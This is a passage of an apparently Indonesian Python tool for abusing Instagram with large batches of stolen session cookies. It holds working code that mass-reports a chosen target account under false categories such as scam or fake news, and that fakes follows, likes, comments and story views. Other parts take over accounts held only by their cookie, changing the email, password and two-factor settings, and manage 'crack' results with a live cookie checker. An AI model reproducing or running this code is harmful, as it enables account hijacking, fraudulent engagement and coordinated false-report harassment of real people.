                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Melaporkan Akun Target, Jika Semua Gagal Kemungkinan Cookie Kamu[italic yellow] Invalid[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                    self.full_name, self.user_id = Convert().Username(cookies, username, 'Report')
                    for z in open('Results/Cookie.txt', 'r').read().splitlines():
                        try:
                            Laporkan().Get_Laporkan(username, self.user_id, z, '6')
                            Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}    ", end='\r')
                            time.sleep(0.007)
                        except (RequestException, KeyboardInterrupt):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
                            time.sleep(10.5)
                            continue
                        except (Exception) as e:
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')
                            time.sleep(2.0)
                    Console().print("\r                                                                       ", end='\r')
                    time.sleep(0.07)
                    Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}")
                    exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"));os.system('xdg-open https://wa.me/6283847921480')
                time.sleep(3.5)
                Menu().Utama(List = [])
        elif query == '07':
            Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Username[italic white] Target Pastikan Akun Tidak[italic red] Terkunci[italic white] Dan Username Tersebut Benar, Misalnya :[italic green] rozhak_official", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Username) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
            username = Console().input("[bold royal_blue1]   ╰─> ")
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Memproses Followers, Jika Semua Gagal Kemungkinan Cookie Kamu[italic yellow] Invalid[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            self.full_name, self.user_id = Convert().Username(cookies, username, 'Automation')
            for z in open('Results/Cookie.txt', 'r').read().splitlines():
                try:
                    Submit_Automation().Follow_Akun(z, self.user_id, username)
                    Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}    ", end='\r')
                    time.sleep(0.007)
                except (RequestException, KeyboardInterrupt):
                    Console().print("\r                                                                       ", end='\r')
                    time.sleep(0.07)
                    Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
                    time.sleep(10.5)
                    continue
                except (Exception) as e:
                    Console().print("\r                                                                       ", end='\r')
                    time.sleep(0.07)
                    Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')
                    time.sleep(2.0)
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold green] @{username}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}")
            exit()
        elif query == '08':
            if Player['Type'] == 'Premium':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Link Story[italic white] Target Pastikan Akun Tidak[italic red] Terkunci[italic white] Dan Link Tersebut Benar, Misalnya :[italic green] https://www.instagram.com/stories/\nrozhak_official/3108286489347228124/", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Stories) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                stories_url = Console().input("[bold royal_blue1]   ╰─> ")
                try:
                    self.story_id = re.search('(\d+)', str(stories_url)).group(1)
                except (AttributeError):
                    self.story_id = ("Error")
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Memproses Views Story, Jika Semua Gagal Kemungkinan Cookie Kamu[italic yellow] Invalid[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                for z in open('Results/Cookie.txt', 'r').read().splitlines():
                    try:
                        Submit_Automation().Story_Viewer(z, stories_url)
                        Console().print(f"[bold royal_blue1]   ──>[bold green] @{self.story_id}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}    ", end='\r')
                        time.sleep(0.007)
                    except (RequestException, KeyboardInterrupt):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
                        time.sleep(10.5)
                        continue
                    except (Exception) as e:
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')
                        time.sleep(2.0)
                Console().print("\r                                                                       ", end='\r')
                time.sleep(0.07)
                Console().print(f"[bold royal_blue1]   ──>[bold green] @{self.story_id}[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}")
                exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"));os.system('xdg-open https://wa.me/6283847921480')
                time.sleep(3.5)
                Menu().Utama(List = [])
        elif query == '09':
            if Player['Type'] == 'Premium':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Link Postingan[italic white] Target Pastikan Postingan Benar Dan Tidak Terkunci, Misalnya :[italic green] https://www.instagram.com/p/CXyPwLSJCtl/", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Postingan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                post_url = Console().input("[bold royal_blue1]   ╰─> ")
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Memproses Post Likes, Jika Semua Gagal Kemungkinan Cookie Kamu[italic yellow] Invalid[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                self.media_id = Convert().Postingan(cookies, post_url)
                for z in open('Results/Cookie.txt', 'r').read().splitlines():
                    try:
                        Submit_Automation().Like_Postingan(z, self.media_id)
                        Console().print(f"[bold royal_blue1]   ──>[bold green] @{self.media_id }[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}    ", end='\r')
                        time.sleep(0.007)
                    except (RequestException, KeyboardInterrupt):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
                        time.sleep(10.5)
                        continue
                    except (Exception) as e:
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')
                        time.sleep(2.0)
                Console().print("\r                                                                       ", end='\r')
                time.sleep(0.07)
                Console().print(f"[bold royal_blue1]   ──>[bold green] @{self.media_id }[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}")
                exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"));os.system('xdg-open https://wa.me/6283847921480')
                time.sleep(3.5)
                Menu().Utama(List = [])
        elif query == '10':
            if Player['Type'] == 'Premium':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Link Postingan[italic white] Target Pastikan Postingan Benar Dan Tidak Terkunci, Misalnya :[italic green] https://www.instagram.com/p/CXyPwLSJCtl/", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Postingan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                post_url = Console().input("[bold royal_blue1]   ╰─> ")
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Teks[italic green] Komentar[italic white], Gunakan \"[italic red]+[italic white]\" Untuk Komentar Secara Acak, Misalnya :[italic green] Hello World!+Keren Bang+Mantap Bang",  title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Komentar) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                komentar = Console().input("[bold royal_blue1]   ╰─> ")
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sedang Memproses Komentar, Jika Semua Gagal Kemungkinan Cookie Kamu[italic yellow] Invalid[italic white] Dan Gunakan[italic red] CTRL + Z[italic white] Untuk Berhenti!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                self.media_id = Convert().Postingan(cookies, post_url)
                for z in open('Results/Cookie.txt', 'r').read().splitlines():
                    try:
                        Submit_Automation().Komentar_Postingan(z, self.media_id, komentar)
                        Console().print(f"[bold royal_blue1]   ──>[bold green] @{self.media_id }[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}    ", end='\r')
                        time.sleep(0.007)
                    except (RequestException, KeyboardInterrupt):
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
                        time.sleep(10.5)
                        continue
                    except (Exception) as e:
                        Console().print("\r                                                                       ", end='\r')
                        time.sleep(0.07)
                        Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')
                        time.sleep(2.0)
                Console().print("\r                                                                       ", end='\r')
                time.sleep(0.07)
                Console().print(f"[bold royal_blue1]   ──>[bold green] @{self.media_id }[bold white]/[bold blue]{self.total_cookies}[bold white]/[bold blue]{Looping}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Checkpoint)}")
                exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"));os.system('xdg-open https://wa.me/6283847921480')
                time.sleep(3.5)
                Menu().Utama(List = [])
        elif query == '11':
            if os.path.exists('Data/Amankan.json') == False:
                Login().Amankan()
                self.cookies = json.loads(open('Data/Amankan.json', 'r').read())['Cookie']
                Tambahan().Menu_Amankan(self.cookies)
            else:
                self.cookies = json.loads(open('Data/Amankan.json', 'r').read())['Cookie']
                Tambahan().Menu_Amankan(self.cookies)
        elif query == '12':
            os.remove("Results/Cookie.txt")
            Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sedang Kembali Ke Daftar Menu Sebelumnya, Silahkan Tunggu...", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Kembali) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(3.5)
            Menu().Utama(List = [])
        else:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Daftar Menu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Tidak Diketahui) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(3.5)
            Menu().Utama(List = [])

    def Menu_Amankan(self, cookies):
        try:
            Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Ganti Email Akun Instagram      [bold green]04[bold white]. Hapus Nomor Akun Center
[bold green]02[bold white]. Pasang Autentikasi 2 Faktor     [bold green]05[bold white]. Hapus Akun Facebook
[bold green]03[bold white]. Ubah Password Instagram         [bold green]06[bold white]. Ganti Cookies""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Amankan Akun) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
            query = Console().input("[bold royal_blue1]   ╰─> ")
            if query == '1' or query == '01':
                self.status_akun = Amankan().Akun_Center(cookies)
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Alamat[italic green] Email Baru[italic white], Gunakan Fake Email Atau Gmail Agar Kode Konfirmasi[italic red] Masuk[italic white], Misalnya :[italic green] rozhak@gmail.com[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (New Email) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                new_email = Console().input("[bold royal_blue1]   ╰─> ")
                if self.status_akun == 'Akun Biasa':
                    Amankan().Ganti_Email_Biasa(cookies, new_email)
                else:
                    Amankan().Ganti_Email_Center(cookies, new_email)
            elif query == '2' or query == '02':
                if Player['Type'] == 'Premium':
                    self.status_akun = Amankan().Akun_Center(cookies)
                    if self.status_akun == 'Akun Biasa':
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Bukan Account Center Tidak Dapat Menambahkan Autentikasi 2 Faktor!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Amankan().Autentikasi_2_Faktor_Center(cookies)
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            elif query == '3' or query == '03':
                self.status_akun = Amankan().Akun_Center(cookies)
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic red] Password Lama[italic white] Dan[italic green] Password Baru[italic white] Dengan Pemisah Koma, Misalnya :[italic green] Rozhak123,Rozhak123%", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Password Lama Dan Baru) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                old_new_password = Console().input("[bold royal_blue1]   ╰─> ")
                self.old_password, self.new_password = old_new_password.split(',')[0], old_new_password.split(',')[1]
                if self.status_akun == 'Akun Biasa':
                    Amankan().Ubah_Password_Biasa(cookies, self.old_password, self.new_password)
                else:
                    Amankan().Ubah_Password_Center(cookies, self.old_password, self.new_password)
            elif query == '4' or query == '04':
                self.status_akun = Amankan().Akun_Center(cookies)
                if self.status_akun == 'Akun Biasa':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Fitur Hapus Nomor Telpon Hanya Tersedia Di Accounts Center!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    Amankan().Hapus_Nomor_Center(cookies)
            elif query == '5' or query == '05':
                self.status_akun = Amankan().Akun_Center(cookies)
                Amankan().Hapus_Akun_Facebook(cookies)
            elif query == '6' or query == '06':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Cookie Akun Instagram Gunakan[italic green] A2F[italic white] Supaya Akun Tidak Terkena[italic red] Checkpoint[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                cookies = Console().input("[bold royal_blue1]   ╰─> ")
                self.first_name, self.username, self.birthday = Login().My_Akun(cookies)
                with open('Data/Amankan.json', 'w') as w:
                    w.write(json.dumps({
                        "Cookie": cookies,
                    }))
                w.close()
                time.sleep(2.5)
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic green]Kamu Berhasil Login Silahkan Jalankan Uang Untuk Masuk Ke Menu", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Login Sukses) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Daftar Menu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Tidak Diketahui) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(3.5)
                Menu().Utama(List = [])
        except (Exception) as e:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
            exit()

    def Lihat_Hasil_Menu(self):
        try:
            Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Lihat Hasil Crack Checkpoint    [bold green]05[bold white]. Gabungkan Hasil Success
[bold green]02[bold white]. Lihat Hasil Crack Success       [bold green]06[bold white]. Pindahkan Hasil Checkpoint
[bold green]03[bold white]. Gabungkan Hasil Checkpoint      [bold green]07[bold white]. Live Cookies Checker
[bold green]04[bold white]. Pindahkan Hasil Success         [bold green]08[bold white]. Kembali ([bold red]Back[bold white])""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Results Crack) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
            query = Console().input("[bold royal_blue1]   ╰─> ")
            if query == '1' or query == '01':
                Results().Tampilkan_Checkpoint()
            elif query == '2' or query == '02':
                Results().Tampilkan_Success()
            elif query == '3' or query == '03':
                Results().Gabungkan_Checkpoint()
            elif query == '4' or query == '04':
                Results().Pindahkan_Success()
            elif query == '5' or query == '05':
                Results().Gabungkan_Success()
            elif query == '6' or query == '06':
                Results().Pindahkan_Checkpoint()
            elif query == '7' or query == '07':
                Checker().Cookies()
            elif query == '8' or query == '08':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sedang Kembali Ke Daftar Menu Sebelumnya, Silahkan Tunggu...", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Kembali) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(3.5)
                Menu().Utama(List = [])
            else:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Daftar Menu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Tidak Diketahui) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(4.5)
                Menu().Utama(List = [])
        except (Exception) as e:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
            exit()

class Laporkan:

    def __init__(self) -> None:
        pass

    def Get_Laporkan(self, username, object_id, cookies, status):
        global Looping
        with requests.Session() as r:
            Looping += 1
            r.headers.update({
                'sec-fetch-dest': 'empty',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
                'referer': 'https://www.instagram.com/{}/'.format(username),
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
                'sec-fetch-mode': 'cors',
            })
            data = {
                'container_module': 'profilePage',
                'entry_point': '1',
                'frx_prompt_request_type': '1',
                'location': '2',
                'object_type': '5',
                'object_id': object_id,
            }
            response = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                'cookie': cookies
            })
            if '"status":"ok"' in str(response.text):
                self.context = json.loads(response.text)['response']['context']
                self.Laporkan_Akun(username, object_id, cookies, status, self.context)
            else:
                try:
                    self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                    Console().print(f"[bold royal_blue1]   ╰─>[bold red] Gagal {self.ds_user_id} Username...", end='\r');time.sleep(1)
                    return 1
                except (AttributeError):
                    return 2

    def Laporkan_Akun(self, username, object_id, cookies, status, context):
        with requests.Session() as r:
            try:
                self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
            except (AttributeError):
                self.ds_user_id = (0)
            r.headers.update({
                'sec-fetch-dest': 'empty',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
                'referer': 'https://www.instagram.com/{}/'.format(username),
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
                'sec-fetch-mode': 'cors',
            })
            data = {
                'context': context,
                'selected_tag_type': 'ig_report_account',
            }
            response = r.post('https://www.instagram.com/api/v1/web/reports/log_tag_selected/', data = data, cookies = {
                'cookie': cookies
            }).text
            if '"status":"ok"' in str(response):
                data = {
                    'context': context,
                    'frx_prompt_request_type': '2',
                    'entry_point': '1',
                    'container_module': 'profilePage',
                    'location': '2',
                    'selected_tag_types': '["ig_report_account"]',
                    'object_type': '5',
                    'object_id': object_id,
                }
                response2 = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                    'cookie': cookies
                })
                if '"status":"ok"' in str(response2.text):
                    self.context = json.loads(response2.text)['response']['context']
                    data = {
                        'selected_tag_type': 'ig_its_inappropriate',
                        'context': context,
                    }
                    response3 = r.post('https://www.instagram.com/api/v1/web/reports/log_tag_selected/', data = data, cookies = {
                        'cookie': cookies
                    }).text
                    if '"status":"ok"' in str(response3):
                        if status == '1':
                            self.Laporkan_Akun_Spam(cookies, object_id, username, self.context)
                        elif status == '2':
                            self.Laporkan_Akun_Bunuh_Diri(cookies, object_id, username, self.context)
                        elif status == '3':
                            self.Laporkan_Akun_Bullying(cookies, object_id, username, self.context)
                        elif status == '4':
                            self.Laporkan_Akun_Ujaran_Kebencian(cookies, object_id, username, self.context)
                        elif status == '5':
                            self.Laporkan_Akun_Penipuan(cookies, object_id, username, self.context)
                        else:
                            self.Laporkan_Akun_Informasi_Palsu(cookies, object_id, username, self.context)
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold green] Gagal {self.ds_user_id} Username...", end='\r')
                        time.sleep(1)
                        return 1
                else:
                    Console().print(f"[bold royal_blue1]   ╰─>[bold yellow] Gagal {self.ds_user_id} Username...", end='\r')
                    time.sleep(1)
                    return 2
            else:
                Console().print(f"[bold royal_blue1]   ╰─>[bold red] Gagal {self.ds_user_id} Username...", end='\r')
                time.sleep(1)
                return 3

    def Laporkan_Akun_Informasi_Palsu(self, cookies, object_id, username, context):
        with requests.Session() as r:
            r.headers.update({
                'sec-fetch-dest': 'empty',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
                'referer': 'https://www.instagram.com/{}/'.format(username),
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
                'sec-fetch-mode': 'cors',
            })
            data = {
                'frx_prompt_request_type': '2',
                'entry_point': '1',
                'container_module': 'profilePage',
                'location': '2',
                'object_type': '5',
                'object_id': object_id,
                'context': context,
                'selected_tag_types': '["ig_its_inappropriate"]',
            }
            response = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                'cookie': cookies
            })
            if '"status":"ok"' in str(response.text):
                self.context = json.loads(response.text)['response']['context']
                data = {
                    'selected_tag_type': 'ig_false_news',
                    'context': self.context,
                }
                response2 = r.post('https://www.instagram.com/api/v1/web/reports/log_tag_selected/', data = data, cookies = {
                    'cookie': cookies
                }).text
                if '"status":"ok"' in str(response2):
                    data = {
                        'frx_prompt_request_type': '2',
                        'entry_point': '1',
                        'container_module': 'profilePage',
                        'location': '2',
                        'object_type': '5',
                        'object_id': object_id,
                        'context': self.context,
                        'selected_tag_types': '["ig_false_news"]',
                    }
                    response3 = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                        'cookie': cookies
                    })
                    if '"status":"ok"' in str(response3.text):
                        self.follow_up_actions_title = json.loads(response3.text)['response']['follow_up_actions_title']['text']
                        try:
                            self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                            self.Convert_To_Username(cookies, self.ds_user_id)
                        except (Exception):
                            self.username = ('Error')
                        Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Response :[bold yellow] {self.follow_up_actions_title}
[bold white]Pelapor :[bold green] https://www.instagram.com/{self.username}""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                        Sukses.append(response3.text)
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Gagal @{username} Username...", end='\r')
                        time.sleep(1)
                        Checkpoint.append(response3.text)
                        return 1
                else:
                    return 2
            else:
                return 3

    def Laporkan_Akun_Penipuan(self, cookies, object_id, username, context):
        with requests.Session() as r:
            r.headers.update({
                'sec-fetch-dest': 'empty',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
                'referer': 'https://www.instagram.com/{}/'.format(username),
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'x-asbd-id': '198387',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
                'sec-fetch-mode': 'cors',
            })
            data = {
                'frx_prompt_request_type': '2',
                'entry_point': '1',
                'container_module': 'profilePage',
                'location': '2',
                'object_type': '5',
                'object_id': object_id,
                'context': context,
                'selected_tag_types': '["ig_its_inappropriate"]',
            }
            response = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                'cookie': cookies
            })
            if '"status":"ok"' in str(response.text):
                self.context = json.loads(response.text)['response']['context']
                data = {
                    'selected_tag_type': 'ig_product_scam_fraud_v2',
                    'context': self.context,
                }
                response2 = r.post('https://www.instagram.com/api/v1/web/reports/log_tag_selected/', data = data, cookies = {
                    'cookie': cookies
                }).text
                if '"status":"ok"' in str(response2):
                    data = {
                        'frx_prompt_request_type': '2',
                        'entry_point': '1',
                        'container_module': 'profilePage',
                        'location': '2',
                        'object_type': '5',
                        'object_id': object_id,
                        'context': self.context,
                        'selected_tag_types': '["ig_product_scam_fraud_v2"]',
                    }
                    response3 = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                        'cookie': cookies
                    })
                    response3 = r.post('https://www.instagram.com/api/v1/web/reports/get_frx_prompt/', data = data, cookies = {
                        'cookie': cookies
                    })
                    if '"status":"ok"' in str(response3.text):
                        self.follow_up_actions_title = json.loads(response3.text)['response']['follow_up_actions_title']['text']
                        try:
                            self.ds_user_id = re.search('ds_user_id=(\d+);', str(cookies)).group(1)
                            self.Convert_To_Username(cookies, self.ds_user_id)
                        except (Exception):
                            self.username = ('Error')
                        Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Response :[bold yellow] {self.follow_up_actions_title}
[bold white]Pelapor :[bold green] https://www.instagram.com/{self.username}""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
